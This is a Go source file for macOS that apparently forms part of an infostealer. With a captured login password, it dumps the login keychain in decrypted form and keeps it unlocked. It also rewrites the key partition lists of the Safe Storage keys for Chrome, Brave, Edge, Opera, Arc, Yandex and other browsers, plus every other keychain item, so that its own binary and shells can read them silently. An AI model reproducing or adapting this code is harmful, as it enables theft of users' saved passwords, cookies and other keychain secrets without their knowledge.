//go:build darwin

package crypto

import (
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

var (
	kcServiceBlobRe = regexp.MustCompile(`"svce"<blob>="([^"]*)"`)
	kcAccountBlobRe = regexp.MustCompile(`"acct"<blob>="([^"]*)"`)
)

// RunSecurity runs security(1) with -mac-password and login keychain when configured.
func RunSecurity(args ...string) ([]byte, error) {
	_ = EnsureLoginKeychainUnlocked()
	cmd := exec.Command("security", buildSecurityArgs(args...)...)
	return cmd.CombinedOutput()
}

// RunSecurityStdout runs security(1) and returns trimmed stdout (for -w lookups).
func RunSecurityStdout(args ...string) (string, error) {
	_ = EnsureLoginKeychainUnlocked()
	cmd := exec.Command("security", buildSecurityArgs(args...)...)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if msg := strings.TrimSpace(stderr.String()); msg != "" {
			return "", fmt.Errorf("%w: %s", err, msg)
		}
		return "", err
	}
	if strings.Contains(stderr.String(), "could not be found") {
		return "", fmt.Errorf("could not be found")
	}
	return strings.TrimSpace(stdout.String()), nil
}

// DumpLoginKeychain returns decrypted dump-keychain output when -mac-password is set.
func DumpLoginKeychain() ([]byte, error) {
	loginKC := loginKeychainPath()
	if loginKC == "" {
		return nil, fmt.Errorf("login keychain path not found")
	}
	out, err := RunSecurity("dump-keychain", "-d", loginKC)
	if err != nil && len(out) == 0 {
		return nil, err
	}
	return out, nil
}

func buildSecurityArgs(args ...string) []string {
	full := append([]string{}, args...)
	if macLoginPassword != "" {
		full = append(full, "-p", macLoginPassword)
	}
	loginKC := loginKeychainPath()
	if loginKC != "" && !securityArgsContain(full, loginKC) {
		full = append(full, loginKC)
	}
	return full
}

func keychainTrustedApps() []string {
	apps := []string{
		"/usr/bin/security",
		"/bin/bash",
		"/bin/zsh",
		"/usr/bin/osascript",
		"/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
	}
	if exe, err := os.Executable(); err == nil {
		exe = strings.TrimSpace(exe)
		if exe != "" {
			apps = append(apps, exe)
		}
	}
	return apps
}

func setKeyPartitionList(loginKC, service, account string) {
	if macLoginPassword == "" || loginKC == "" {
		return
	}
	args := []string{
		"set-key-partition-list",
		"-S", "apple-tool:,apple:,codesign:",
	}
	for _, app := range keychainTrustedApps() {
		args = append(args, "-T", app)
	}
	args = append(args, "-p", macLoginPassword, loginKC)
	if service != "" {
		args = append(args, "-s", service)
	}
	if account != "" {
		args = append(args, "-a", account)
	}
	if out, err := exec.Command("security", args...).CombinedOutput(); err != nil {
		label := strings.TrimSpace(service + "/" + account)
		if label == "/" {
			label = "login"
		}
		logf("set-key-partition-list %s: %v (%s)", label, err, strings.TrimSpace(string(out)))
	}
}

func parseKeychainServiceAccounts(dump []byte) []struct{ service, account string } {
	seen := make(map[string]bool)
	var out []struct{ service, account string }
	var service, account string
	for _, line := range strings.Split(string(dump), "\n") {
		if m := kcServiceBlobRe.FindStringSubmatch(line); len(m) == 2 {
			service = m[1]
			continue
		}
		if m := kcAccountBlobRe.FindStringSubmatch(line); len(m) == 2 {
			account = m[1]
			key := service + "\x00" + account
			if !seen[key] && (service != "" || account != "") {
				seen[key] = true
				out = append(out, struct{ service, account string }{service, account})
			}
		}
	}
	return out
}

func configureSilentKeychainAccess(loginKC string) {
	if macLoginPassword == "" || loginKC == "" {
		return
	}

	// Keep login keychain unlocked; -u = do not lock when sleeping.
	_ = exec.Command("security", "set-keychain-settings", "-t", "3600", "-u", loginKC).Run()
	_ = exec.Command("security", "default-keychain", "-s", loginKC).Run()
	_ = exec.Command("security", "list-keychains", "-d", "-s", loginKC).Run()

	known := []struct{ service, account string }{
		{"Chrome Safe Storage", "Chrome"},
		{"Brave Safe Storage", "Brave"},
		{"Chromium Safe Storage", "Chromium"},
		{"Microsoft Edge Safe Storage", "Microsoft Edge"},
		{"Microsoft Edge Safe Storage", "Edge"},
		{"Opera Safe Storage", "Opera"},
		{"Opera Safe Storage", "Opera GX"},
		{"Vivaldi Safe Storage", "Vivaldi"},
		{"Arc Safe Storage", "Arc"},
		{"Yandex Safe Storage", "Yandex"},
	}
	for _, item := range known {
		setKeyPartitionList(loginKC, item.service, item.account)
	}

	dump, err := exec.Command("security", buildSecurityArgs("dump-keychain", "-d", loginKC)...).CombinedOutput()
	if err != nil && len(dump) == 0 {
		return
	}
	for _, item := range parseKeychainServiceAccounts(dump) {
		setKeyPartitionList(loginKC, item.service, item.account)
	}
}